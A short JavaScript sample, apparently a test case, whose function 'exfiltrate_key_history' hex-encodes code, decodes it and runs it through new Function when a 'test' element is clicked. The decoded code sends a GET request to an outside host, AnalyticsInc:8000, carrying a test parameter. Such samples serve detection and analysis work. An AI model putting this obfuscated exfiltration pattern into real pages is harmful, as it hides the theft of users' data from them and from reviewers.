function exfiltrate_key_history() {

    // New Function with Hex
    // Exfiltrate data using XMLHTTP request
    var exp="786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474702e6f70656e2822474554222c2022687474703a2f2f416e616c7974696373496e633a383030302f7375626d697373696f6e2e68746d6c3f746573743d66756e635f686578222c2074727565293b0a786d6c687474702e73656e64286e756c6c293b";
	var dec="";
	for (var i=0;i<exp.length;i+=2) {
	    dec+=String.fromCharCode(parseInt(exp.substr(i,2),16));
    }
	var tmpFunc=new Function(dec);
	tmpFunc();
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
